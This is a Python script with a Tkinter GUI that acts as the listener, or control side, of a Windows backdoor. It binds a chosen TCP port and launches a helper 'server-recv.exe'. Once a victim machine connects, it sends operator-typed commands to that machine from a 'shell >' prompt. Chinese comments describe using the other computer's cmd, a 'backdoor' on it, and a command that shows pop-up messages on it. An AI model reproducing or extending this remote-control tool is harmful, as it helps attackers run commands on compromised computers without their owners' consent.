from tkinter import*
from tkinter import messagebox
import ctypes
import threading
import socket
import os

#-------------------------------------------------


STD_INPUT_HANDLE = -10
STD_OUTPUT_HANDLE = -11
STD_ERROR_HANDLE = -12
 
FOREGROUND_BLACK = 0x0
FOREGROUND_BLUE = 0x01  # text color contains blue.
FOREGROUND_GREEN = 0x02  # text color contains green.
FOREGROUND_RED = 0x04  # text color contains red.
FOREGROUND_INTENSITY = 0x08  # text color is intensified.
 
BACKGROUND_BLUE = 0x10  # background color contains blue.
BACKGROUND_GREEN = 0x20  # background color contains green.
BACKGROUND_RED = 0x40  # background color contains red.
BACKGROUND_INTENSITY = 0x80  # background color is intensified.
 
 
class Color:

    std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
 
    def set_cmd_color(self, color, handle=std_out_handle):
        
        bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
        return bool
 
    def reset_color(self):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)
 
    def print_red_text(self, print_text):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_INTENSITY)
        print(print_text)
        self.reset_color()
 
    def print_green_text(self, print_text):
        self.set_cmd_color(FOREGROUND_GREEN | FOREGROUND_INTENSITY)
        print(print_text)
        self.reset_color()
 
    def print_blue_text(self, print_text):
        self.set_cmd_color(FOREGROUND_BLUE | FOREGROUND_INTENSITY)
        print(print_text)
        self.reset_color()
 
    def print_red_text_with_blue_bg(self, print_text):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_INTENSITY | BACKGROUND_BLUE | BACKGROUND_INTENSITY)
        print(print_text)
        self.reset_color()

clr = Color()
clr.print_red_text("[Warning]如果出现,连接成功,你便可以使用对方的cmd命令")
clr.print_red_text('[Warning]请注意命令行,有命令返回信息以及大量垃圾信息')
#clr.print_red_text("[Warning]在目录下如果只有一个后门的话请不要使用命令'dir',否则将会中断连接")
#clr.print_red_text('[Warning]show + 内容  可以在对方电脑上用弹窗显示内容    例如:‘show 你好’  命令')

#---------------------------------------------------------------------------

def start_recv():
    os.system('dir')
    os.system('bin\listen\server-recv.exe')


def start():
    lport = int(en.get())
    tcp_service_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    tcp_service_socket.bind(('',lport))
    print('start server.............')
    t = threading.Thread(target=start_recv)
    t.start()
    print('listen on '+str(lport) + '.......')

    tcp_service_socket.listen(128)#3 让默认套接字由主动变为被动(监听)
    client_socket,clientAddr =  tcp_service_socket.accept()
    print('[*]连接成功!')
    f = open('conf.txt','w')
    f.write(str(lport))
    f.close()
    while True:
        cmd = input("shell >").strip()
        client_socket.send(cmd.encode('utf-8'))


def stop():
    pass

#---------------------------------------------------
tk = Tk()
tk.title('监听-windows')
tk.geometry('300x160+420+200')
#----------------------------------------------------
en = Entry(tk)
en.place(x=80,y=40)
#--------------------------text------------------
w= Label(tk,text='端口:',fg="red")
w.place(x=20,y=40)
#------------------------start or stop----------------
b = Button(tk, text ="开始监听", command=start)
b.place(x=20,y=80)
b_2 = Button(tk, text ="停止", command=stop)
b_2.place(x=200,y=80)
tk.mainloop()
#------------------------start-GUI--------------------

#-------------------------over-------------------------
